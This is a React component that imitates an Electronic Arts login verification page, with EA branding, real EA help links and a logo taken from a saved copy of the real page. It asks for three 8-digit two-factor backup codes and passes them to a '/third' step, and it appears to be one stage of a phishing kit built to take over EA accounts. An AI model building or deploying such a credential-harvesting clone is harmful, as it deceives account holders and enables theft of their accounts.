import logo from "./logo.svg";
import "./App.css";

function Second() {
  return (
    <div className="a">
      <div className="form-container">
        <form method="post" id="loginForm">
          <div id="tfa-login" className="views">
            <div
              className="otknotice-stripe otknotice-active"
              id="junoBannerBox"
              style={{display: "none"}}
            >
              <div className="otknotice-stripe-message">
                <span className="otkicon">
                  <svg
                    height="24"
                    viewBox="0 0 24 24"
                    width="24"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <g fill="none" fillRule="evenodd">
                      <path d="m0 0h24v24h-24z"></path>
                      <path
                        d="m12 1.5c5.7989899 0 10.5 4.70101013 10.5 10.5 0 5.7989899-4.7010101 10.5-10.5 10.5-5.79898987 0-10.5-4.7010101-10.5-10.5 0-5.79898987 4.70101013-10.5 10.5-10.5zm0 2c-4.69442037 0-8.5 3.80557963-8.5 8.5 0 4.6944204 3.80557963 8.5 8.5 8.5 4.6944204 0 8.5-3.8055796 8.5-8.5 0-4.69442037-3.8055796-8.5-8.5-8.5zm0 7.5c.5128358 0 .9355072.3860402.9932723.8833789l.0067277.1166211v4c0 .5522847-.4477153 1-1 1-.5128358 0-.9355072-.3860402-.9932723-.8833789l-.0067277-.1166211v-4c0-.5522847.4477153-1 1-1zm0-3.5c.5522847 0 1 .44771525 1 1s-.4477153 1-1 1-1-.44771525-1-1 .4477153-1 1-1z"
                        fill="#276afc"
                      ></path>
                    </g>
                  </svg>
                </span>
                <span className="otkc otkc-small">
                  <strong></strong>
                </span>
              </div>
            </div>
            <div
              className="otknotice-stripe otknotice-active"
              id="online-general-info"
              style={{display: "none"}}
            >
              <div className="otknotice-stripe-message">
                <span className="otkicon">
                  <svg
                    height="24"
                    viewBox="0 0 24 24"
                    width="24"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <g fill="none" fillRule="evenodd">
                      <path d="m0 0h24v24h-24z"></path>
                      <path
                        d="m12 1.5c5.7989899 0 10.5 4.70101013 10.5 10.5 0 5.7989899-4.7010101 10.5-10.5 10.5-5.79898987 0-10.5-4.7010101-10.5-10.5 0-5.79898987 4.70101013-10.5 10.5-10.5zm0 2c-4.69442037 0-8.5 3.80557963-8.5 8.5 0 4.6944204 3.80557963 8.5 8.5 8.5 4.6944204 0 8.5-3.8055796 8.5-8.5 0-4.69442037-3.8055796-8.5-8.5-8.5zm0 7.5c.5128358 0 .9355072.3860402.9932723.8833789l.0067277.1166211v4c0 .5522847-.4477153 1-1 1-.5128358 0-.9355072-.3860402-.9932723-.8833789l-.0067277-.1166211v-4c0-.5522847.4477153-1 1-1zm0-3.5c.5522847 0 1 .44771525 1 1s-.4477153 1-1 1-1-.44771525-1-1 .4477153-1 1-1z"
                        fill="#276afc"
                      ></path>
                    </g>
                  </svg>
                </span>
                <span className="otkc otkc-small"></span>
              </div>
            </div>
            <section id="verificationGate" className="">
              <a
                href="/"
                role="button"
                id="backToLoginBtn"
                className="back-btn"
              >
                <i className="otkicon"></i>
                <span className="quantum-input-icon back-btn-icon">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 16 16"
                    className="injected-svg css-ojkidl"
                    data-src="/static/media/ARROW_LEFT.e40e5952.svg"
                  >
                    <g
                      id="Icons/SM/Navigation/Arrow-Left"
                      fill="none"
                      fillRule="evenodd"
                    >
                      <path id="Bounding-Box" d="M0 0h16v16H0z"></path>
                      <path
                        id="Primary"
                        fill="#FFF"
                        d="M5.293 4.707a1 1 0 0 1 1.414-1.414l4 4a1 1 0 0 1 0 1.415l-4 4a1 1 0 1 1-1.414-1.415L8.586 8 5.293 4.707z"
                        transform="matrix(-1 0 0 1 16 0)"
                      ></path>
                    </g>
                  </svg>
                </span>{" "}
                Back{" "}
              </a>
              <img
                className="header"
                aria-hidden="true"
                src="./SIGN IN_files/EALogo-New.svg"
              />
              <h1 className="otktitle otktitle-2">Enter your code</h1>
              <div className="otkc verify">
                {" "}
                We need your backup codes <a href="https://myaccount.ea.com/cp-ui/security/index">(https://myaccount.ea.com/cp-ui/security/index)</a> to 
                verify your identity. Enter your code below.
                {" "}
              </div>
              <br/>
              <div className="otkform-group">
                <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
                  Backup code 1
                </label>
                <div className="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message otkinput-grouped_radius">
                  <input
                    type="text"
                    id="twoFactorCode"
                    name="oneTimeCode"
                    defaultValue=""
                    placeholder="Enter 8 digit code"
                    autoCorrect="off"
                    autoCapitalize="off"
                    autoComplete="off"
                  />
                </div>
              </div>
              <div className="otkform-group">
                <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
                  Backup code 2
                </label>
                <div className="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message otkinput-grouped_radius">
                  <input
                    type="text"
                    id="twoFactorCode"
                    name="oneTimeCode"
                    defaultValue=""
                    placeholder="Enter 8 digit code"
                    autoCorrect="off"
                    autoCapitalize="off"
                    autoComplete="off"
                  />
                </div>
              </div>
              <div className="otkform-group">
                <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
                  Backup code 3
                </label>
                <div className="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message otkinput-grouped_radius">
                  <input
                    type="text"
                    id="twoFactorCode"
                    name="oneTimeCode"
                    defaultValue=""
                    placeholder="Enter 8 digit code"
                    autoCorrect="off"
                    autoCapitalize="off"
                    autoComplete="off"
                  />
                </div>
              </div>
              <br />
              <span className="otkcheckbox ">
                <input type="hidden" name="_trustThisDevice" defaultValue="" />
                <input
                  type="checkbox"
                  id="trustThisDevice"
                  name="trustThisDevice"
                />
                <label htmlFor="trustThisDevice">
                  <span id="content" className="link-in-message">
                    Remember this device
                  </span>
                </label>
              </span>
              <div className="separator-32"></div>
              <div className="btn-box">
                <input
                  type="hidden"
                  name="_eventId"
                  defaultValue="submit"
                  id="_eventId"
                />
                <a
                  role="button"
                  className="otkbtn otkbtn-primary  zero-margin"
                  href="/third"
                  id="btnSubmit"
                  style={{float:"right",maxWidth:"100%",fontSize:"16px"}}
                >
                  Sign in
                </a>
              </div>
              <div className="separator-16"></div>
              <a
                href=""
                id="resend"
                className="otka otkc resendLink zero-margin"
              >
              </a>
              <div className="separator-6"></div>
              <a
                href="https://help.ea.com/help/account/origin-login-verification-information/"
                target="_blank"
                id="problems-rev-code"
                className="otka otkc resendLink zero-margin"
              >
                {/* <i
                  className="otkicon otkicon-learnmore"
                  style={{fontSize:"22px",height:"16px",width:"24px",display:"inline-flex",top:"0px"}}
                ></i> */}
              </a>
              <br />
            </section>
          </div>
        </form>
      </div>
    </div>
  );
}

export default Second;
